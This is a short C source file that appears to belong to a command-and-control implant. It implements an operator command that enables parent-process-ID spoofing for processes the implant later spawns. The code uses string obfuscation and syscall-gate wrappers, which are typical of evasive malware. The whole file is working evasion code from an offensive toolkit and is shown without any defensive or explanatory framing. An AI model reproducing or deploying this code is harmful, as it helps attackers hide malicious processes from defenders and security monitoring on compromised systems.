#include "config.h"
#ifdef INCLUDE_CMD_PPID

#include "commands.h"
#include "common.h"

// ppid <pid>: spoof the parent process for future spawned processes.
// Consumed by cmd_spawn/cmd_shell via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
VOID cmd_ppid(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD pid = parser_int32(args);
    if (pid == 0) {
        package_add_string(inst, response, XSTR("PPID spoofing disabled"));
        inst->SpoofPPID = 0;
        return;
    }

    // validate the target exists and is accessible
    HANDLE h_proc = inst->Win32.OpenProcess((DWORD)0x0400 /*PROCESS_DUP_HANDLE*/ | (DWORD)0x0800 /*PROCESS_QUERY_INFORMATION*/, FALSE, pid);
    if (!h_proc) {
        package_add_string(inst, response, XSTR("OpenProcess on target PPID failed"));
        response->is_error = TRUE;
        return;
    }
    gate_CloseHandle(inst, h_proc);

    inst->SpoofPPID = pid;
    char msg[64] = {0};
    const char* prefix = XSTR("PPID spoofing set to: ");
    DWORD pos = 0;
    for (; prefix[pos] && pos < 40; pos++) msg[pos] = prefix[pos];
    char tmp[12]; int ti = 0;
    DWORD v = pid;
    while (v > 0) { tmp[ti++] = '0' + (v % 10); v /= 10; }
    for (int j = ti - 1; j >= 0 && pos < 60; j--) msg[pos++] = tmp[j];
    package_add_string(inst, response, msg);
}

#endif
